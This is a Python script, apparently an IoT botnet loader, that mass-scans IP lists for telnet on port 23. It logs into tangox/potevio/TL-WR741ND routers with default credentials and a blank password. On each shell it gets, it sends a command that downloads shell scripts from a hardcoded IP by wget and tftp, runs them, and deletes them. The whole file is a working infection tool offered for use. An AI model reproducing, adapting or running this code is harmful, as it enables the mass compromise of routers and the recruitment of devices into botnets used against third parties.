#!/usr/bin/python
# tangox/potevio/TL-WR741ND Scanner By; LiGhT
import threading
import sys, os, re
import time
import random
import socket
from Queue import *
from sys import stdout

if len(sys.argv) < 3:
	print "Usage: python "+sys.argv[0]+" <list> <threads>"
	sys.exit()

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
queue = Queue()
usernames = ["default", "daemon"]
cmd = "cd /tmp || cd /var || cd /dev; wget  http://185.237.96.86/sensi.sh; tftp -r tftp2.sh -g 185.237.96.86; sh sensi.sh; sh tftp2.sh; rm -rf *.sh"
queueC = 0

for ip in ips:
    queueC += 1
    stdout.write("\r[%d] Added to queue" % queueC)
    stdout.flush()
    queue.put(ip)
print "\n"

def worker():
	try:
		while True:
			try:
				IP = queue.get()
				ball = pump(IP)
				ball.start()
				queue.task_done()
				time.sleep(0.05)
			except:
				print "[*] THREAD UNABLE TO START" #may spam if finished
				pass
	except:
		pass
	
def readUntil(tn, string, timeout=11):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(2048)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

class pump(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		try:
			try:
				tn = socket.socket()
				tn.settimeout(8)
				tn.connect((self.ip,23))
			except Exception:
				tn.close()
			try:
				hoho = ''
				hoho += readUntil(tn, ":")
				if "ogin" in hoho:
					#print "[*] sending user"
					tn.send(usernames[0] + "\n")
					time.sleep(0.1)
			except Exception:
				tn.close()
			try:
				hoho = ''
				hoho += readUntil(tn, ":")
				if "assword" in hoho:
					#print "[*] sending new line"
					tn.send("\r\n\r\n")
				elif "ogin" in hoho:
					#print "[*] sending user"
					tn.send(usernames[1] + "\n")
					time.sleep(0.1)
			except Exception:
				tn.close()
			try:
				hoho = ''
				hoho += readUntil(tn, ":")
				if "ogin" in hoho:
					#print "[*] sending user"
					tn.send(usernames[1] + "\n")
					time.sleep(0.1)
				else:
					#print "[!] LOGIN FAILED %s"%(self.ip)
					tn.close()
			except Exception:
				tn.close()
			try:
				prompt = ''
				prompt += tn.recv(1024)
				if "#" in prompt or "$" in prompt or "default@tangox" in prompt:
					tn.send(cmd + "\n"); print "[%s] Command Sent"%(self.ip); time.sleep(12); tn.close()
			except Exception:
				print "[%s] TIMEOUT"%(self.ip)
				tn.close()
		except:
			pass
	
for balls in xrange(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
		time.sleep(0.002)
	except:
		print "[$] FAILED TO START WORKER THREAD"
		pass